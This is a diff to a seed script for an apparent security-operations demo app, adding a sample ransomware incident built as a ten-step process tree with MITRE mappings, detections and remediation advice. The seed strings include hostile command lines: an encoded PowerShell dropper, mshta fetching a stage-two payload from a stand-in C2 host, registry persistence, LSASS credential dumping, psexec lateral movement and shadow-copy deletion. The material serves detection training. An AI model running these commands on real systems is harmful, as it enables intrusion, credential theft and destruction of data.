@@ -27,7 +27,7 @@ async function seed() {
   const d = db();
 
   await d.exec(`DELETE FROM playbook_executions; DELETE FROM ueba_scores; DELETE FROM kql_saved_queries;
-          DELETE FROM intel_feeds; DELETE FROM incident_alerts; DELETE FROM incident_notes; DELETE FROM incidents; DELETE FROM iocs; DELETE FROM alerts; DELETE FROM events;
+          DELETE FROM intel_feeds; DELETE FROM process_nodes; DELETE FROM incident_alerts; DELETE FROM incident_notes; DELETE FROM incidents; DELETE FROM iocs; DELETE FROM alerts; DELETE FROM events;
           DELETE FROM playbooks; DELETE FROM correlation_rules; DELETE FROM users;`);
   console.log('[Seed] Cleared');
 
@@ -102,6 +102,101 @@ async function seed() {
     await insNote.run(uuidv4(), incId, pick(owners), 'Next steps: confirm scope, contain impacted host/user, preserve logs.', ago(rand(0, 604800000)));
   }
   console.log('[Seed] Incidents: 6');
+
+  // IR-007: Dedicated process-tree demo incident — full phishing-to-ransomware attack chain
+  const insIncFull = d.prepare(`INSERT INTO incidents(id,title,description,severity,status,priority,owner,tags,impact,remediation,lessons_learned,created_at,updated_at) VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?)`);
+  const insProc = d.prepare(`INSERT INTO process_nodes(id,incident_id,parent_id,sequence,pid,ppid,process_name,image,command_line,hostname,username,sha256,event_type,mitre_tactic,mitre_technique,severity,is_malicious,first_detected_by,detection_rule,auto_analysis,impact,remediation,lessons_learned,timestamp) VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)`);
+  const insertProcNodes = d.transaction(async (rows) => { for (const r of rows) await insProc.run(...r); });
+
+  const chainIncId = uuidv4();
+  const chainStart = ago(3 * 86400000); // 3 days ago
+  const chainHost = 'WS-PC-001', chainUser = 'john.doe';
+  const atTime = (offsetMin) => new Date(new Date(chainStart).getTime() + offsetMin * 60000).toISOString();
+
+  const CHAIN = [
+    { parent: null, pid: 4210, ppid: 1120, name: 'OUTLOOK.EXE', image: 'C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE', cmd: 'OUTLOOK.EXE /recycle', evt: 'Process Create', tactic: 'Initial Access', tech: 'T1566.001', sev: 'Low', mal: 0, offset: 0,
+      detectedBy: 'K3 Email Gateway — Attachment Scan', rule: 'Phishing Attachment Heuristic',
+      analysis: 'User john.doe opened Outlook and received an email with a macro-enabled Word attachment (invoice_0847.docm) from a spoofed external vendor domain.',
+      impact: 'Initial foothold established via user-executed phishing lure; no code execution yet.',
+      remediation: 'Quarantine the source email organization-wide and block the sender domain at the email gateway.' },
+    { parent: 0, pid: 4588, ppid: 4210, name: 'WINWORD.EXE', image: 'C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE', cmd: 'WINWORD.EXE /n "C:\\Users\\john.doe\\Downloads\\invoice_0847.docm"', evt: 'Process Create', tactic: 'Initial Access', tech: 'T1566.001', sev: 'Low', mal: 0, offset: 1,
+      detectedBy: 'K3 EDR — Office Macro Monitor', rule: 'Macro-Enabled Document Opened',
+      analysis: 'invoice_0847.docm opened; the document contains an auto-executing VBA macro flagged as obfuscated on open.',
+      impact: 'Malicious macro now has execution context inside a trusted Office process.',
+      remediation: "Enable 'Block macros from the internet' via GPO and enforce Protected View for downloaded documents." },
+    { parent: 1, pid: 5102, ppid: 4588, name: 'powershell.exe', image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', cmd: 'powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAA==', evt: 'Process Create', tactic: 'Execution', tech: 'T1059.001 / T1027', sev: 'High', mal: 1, offset: 2,
+      hash: 'a4d1c9f6e2b8730fca19d5e0b7f2c341a9c8d5e6f1a2b3c4d5e6f7a8b9c0d1e2',
+      detectedBy: 'K3 EDR — Behavioral Detection Engine', rule: 'Suspicious Child Process of Office Application',
+      analysis: 'WINWORD.EXE spawned powershell.exe with a Base64-encoded (-enc) command line — a strong indicator of a malicious macro payload dropper (T1059.001 + T1027 obfuscation).',
+      impact: 'Attacker now has arbitrary code execution on WS-PC-001 as john.doe.',
+      remediation: 'Kill the process tree, isolate the host from the network via EDR, and block the hash of the decoded payload.' },
+    { parent: 2, pid: 5344, ppid: 5102, name: 'cmd.exe', image: 'C:\\Windows\\System32\\cmd.exe', cmd: 'cmd.exe /c whoami /all & systeminfo & net config workstation', evt: 'Process Create', tactic: 'Discovery', tech: 'T1082 / T1033', sev: 'Medium', mal: 1, offset: 4,
+      detectedBy: 'K3 Correlation Rule: Malware Execution Chain', rule: 'Malware Execution Chain',
+      analysis: 'PowerShell spawned cmd.exe to run whoami /all and systeminfo — automated situational-awareness recon typical of post-exploitation frameworks.',
+      impact: 'Attacker enumerated local privileges and domain context to plan the next stage.',
+      remediation: 'Review 4688 command-line logging for the full recon scope and rotate any credentials enumerated.' },
+    { parent: 2, pid: 5601, ppid: 5102, name: 'mshta.exe', image: 'C:\\Windows\\System32\\mshta.exe', cmd: 'mshta.exe http://evil-c2.top/stage2.hta', evt: 'Network Connect', tactic: 'Command and Control', tech: 'T1218.005', sev: 'High', mal: 1, offset: 7,
+      detectedBy: 'IOC Match — C2 Domain (Threat Intel Feed)', rule: 'evil-c2.top DNS/HTTP Match',
+      analysis: 'mshta.exe reached out to evil-c2.top (matches an active LockBit C2 indicator in the threat intel feed) and downloaded a second-stage HTA payload.',
+      impact: 'Stage-2 payload retrieved; an outbound C2 channel is now established.',
+      remediation: 'Block evil-c2.top at the DNS/proxy layer organization-wide and capture PCAP for the investigation.' },
+    { parent: 4, pid: 5890, ppid: 5601, name: 'svchost.exe', image: 'C:\\Users\\john.doe\\AppData\\Local\\Temp\\svchost.exe', cmd: 'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "WindowsUpdate" /d "C:\\Users\\john.doe\\AppData\\Local\\Temp\\svchost.exe" /f && schtasks /create /tn "SysUpdate" /tr "svchost.exe" /sc onlogon', evt: 'Registry Modify', tactic: 'Persistence', tech: 'T1547.001 / T1053.005', sev: 'Critical', mal: 1, offset: 10,
+      hash: 'b7e2f1a9c3d84650fea27bd1c9e4f832bc16d9e0f2a3b4c5d6e7f8a9b0c1d2e3',
+      detectedBy: 'K3 EDR — Behavioral Detection Engine', rule: 'Process Masquerading + Registry Run Key Persistence',
+      analysis: 'Payload dropped to the Temp folder as svchost.exe (masquerading — the legitimate svchost.exe never runs from AppData) and created a Run key plus a scheduled task for persistence across reboots.',
+      impact: 'Attacker persistence achieved; the malware survives reboot and logoff.',
+      remediation: 'Remove the Run key and scheduled task, delete the dropped binary, and submit the hash to MISP.' },
+    { parent: 5, pid: 6120, ppid: 5890, name: 'net.exe', image: 'C:\\Windows\\System32\\net.exe', cmd: 'net view /domain & net share & net group "Domain Admins" /domain', evt: 'Process Create', tactic: 'Discovery', tech: 'T1018 / T1135', sev: 'Medium', mal: 1, offset: 15,
+      detectedBy: 'K3 Correlation Rule: Malware Execution Chain', rule: 'Malware Execution Chain',
+      analysis: 'net.exe used to enumerate domain computers and shares — the attacker mapped the network for lateral-movement targets and identified DC-001 as the domain controller.',
+      impact: 'Internal network topology and lateral-movement targets exposed to the attacker.',
+      remediation: 'Restrict SMB/domain enumeration for standard users and alert on net.exe usage from non-admin context.' },
+    { parent: 5, pid: 6455, ppid: 5890, name: 'procdump.exe', image: 'C:\\Users\\john.doe\\AppData\\Local\\Temp\\procdump.exe', cmd: 'procdump.exe -accepteula -ma lsass.exe lsass_dump.bin', evt: 'File Access', tactic: 'Credential Access', tech: 'T1003.001', sev: 'Critical', mal: 1, offset: 20,
+      hash: 'd41d8cd98f00b204e9800998ecf8427e',
+      detectedBy: 'K3 EDR — Behavioral Detection Engine', rule: 'LSASS Memory Access',
+      analysis: 'procdump.exe (renamed to evade detection) accessed lsass.exe memory to dump credentials — a classic Mimikatz-style credential theft technique; the dump tool hash matches a known Mimikatz variant IOC.',
+      impact: 'Cached domain credentials, including a domain admin service account, are now exposed to the attacker.',
+      remediation: 'Force a password reset for every account cached on this host, enable Credential Guard, and block LSASS access via ASR rules.' },
+    { parent: 7, pid: 6800, ppid: 5890, name: 'psexec.exe', image: 'C:\\Users\\john.doe\\AppData\\Local\\Temp\\psexec.exe', cmd: 'psexec.exe \\\\DC-001 -u CORP\\svc-backup -p ****** cmd.exe', evt: 'Network Connect', tactic: 'Lateral Movement', tech: 'T1021.002', sev: 'Critical', mal: 1, offset: 28,
+      detectedBy: 'T2 Analyst Manual Triage', rule: 'Manual Escalation — SMB Admin Share Authentication',
+      analysis: 'Using the credentials dumped from LSASS, the attacker used psexec.exe to authenticate to DC-001 via SMB admin shares and execute code remotely — pivoting from a single workstation to the domain controller.',
+      impact: 'Compromise has spread from WS-PC-001 to the domain controller (DC-001); full domain compromise is imminent.',
+      remediation: 'Immediately isolate DC-001, disable the compromised admin account, and force a domain-wide credential reset (golden-ticket risk).' },
+    { parent: 8, pid: 7011, ppid: 6800, name: 'vssadmin.exe', image: 'C:\\Windows\\System32\\vssadmin.exe', cmd: 'vssadmin.exe delete shadows /all /quiet && ransom.exe --encrypt --path=\\\\DC-001\\shares', evt: 'Process Create', tactic: 'Impact', tech: 'T1490 / T1486', sev: 'Critical', mal: 1, offset: 35,
+      hash: '4d5a900098765432100fedcba987654',
+      detectedBy: 'K3 EDR — Behavioral Detection Engine (Ransomware Canary)', rule: 'Shadow Copy Deletion + Mass File Encryption',
+      analysis: 'vssadmin.exe delete shadows /all /quiet executed on DC-001, immediately followed by mass file-encryption activity matching LockBit ransomware behavior — the final impact stage of the attack.',
+      impact: 'Full domain compromise: shadow copies destroyed and file shares across the domain encrypted; business operations halted.',
+      remediation: 'Activate the IR/DR plan, restore from offline backups, engage legal/law enforcement, and rebuild DC-001 from clean media.' },
+  ];
+
+  const chainNodeIds = CHAIN.map(() => uuidv4());
+  await insertProcNodes(CHAIN.map((n, i) => [
+    chainNodeIds[i], chainIncId, n.parent === null ? null : chainNodeIds[n.parent], i + 1,
+    n.pid, n.ppid, n.name, n.image, n.cmd, chainHost, chainUser, n.hash || null, n.evt,
+    n.tactic, n.tech, n.sev, n.mal, n.detectedBy, n.rule, n.analysis, n.impact, n.remediation,
+    i === CHAIN.length - 1 ? 'Post-incident review found no single control would have stopped this chain; layered fixes (macro policy, LSASS hardening, segmentation, mail sandboxing) were required.' : null,
+    atTime(n.offset),
+  ]));
+
+  await insIncFull.run(
+    chainIncId,
+    'IR-007: Multi-Stage Ransomware Attack — Phishing to Full Domain Compromise',
+    'Phishing email with a macro-enabled attachment led to PowerShell execution, credential theft via LSASS dumping, lateral movement to the domain controller, and LockBit-style ransomware deployment on WS-PC-001 and DC-001.',
+    'Critical', 'Contained', 1, 'jmaharjan', JSON.stringify(['ransomware', 'phishing', 'lateral-movement', 'process-tree-demo']),
+    'Full compromise of WS-PC-001 and the primary domain controller (DC-001); domain admin credentials stolen; ransomware deployed with shadow-copy deletion, encrypting file shares across the domain. Estimated business disruption: multi-day outage across Security Operations, IT, and Engineering.',
+    'Isolated WS-PC-001 and DC-001 from the network; rebuilt DC-001 from clean media; force-reset all domain credentials (especially the compromised admin account); restored file shares from offline backups; blocked all identified C2 domains/IPs/hashes organization-wide; deployed ASR rules blocking LSASS access and Office-spawned script interpreters.',
+    "Macro execution from internet-sourced Office documents was not blocked by GPO — closed via 'Block macros from the internet' policy. LSASS access was not restricted — Credential Guard and ASR rules are now enforced fleet-wide. No network segmentation existed between workstations and the domain controller — VLAN segmentation and a tiered admin model are being rolled out. The email gateway did not flag the initial phishing attachment — attachment sandboxing has been added to the mail flow.",
+    chainStart, ago(0)
+  );
+
+  for (const title of ['Suspicious PowerShell Execution', 'Credential Dumping - LSASS Access', 'Ransomware IOC Match']) {
+    const linkedAlert = await d.prepare('SELECT id FROM alerts WHERE title = ? LIMIT 1').get(title);
+    if (linkedAlert?.id) await insLink.run(chainIncId, linkedAlert.id);
+  }
+  await insNote.run(uuidv4(), chainIncId, 'jmaharjan', 'Full attack chain reconstructed from EDR process tree — phishing attachment through domain controller compromise. See linked process tree for stage-by-stage detection and remediation detail.', ago(2 * 86400000));
+  await insNote.run(uuidv4(), chainIncId, 'pbasnet', 'Incident contained: both hosts isolated, DC-001 rebuilt, domain-wide credential reset completed. Moving to post-incident review for lessons learned.', ago(86400000));
+  console.log('[Seed] Process tree demo incident (IR-007): 1 incident, 10 process nodes');
 
   // IOCs
   const insI = d.prepare(`INSERT INTO iocs(id,type,value,confidence,severity,source,description,tags,hits,first_seen) VALUES(?,?,?,?,?,?,?,?,?,?)`);
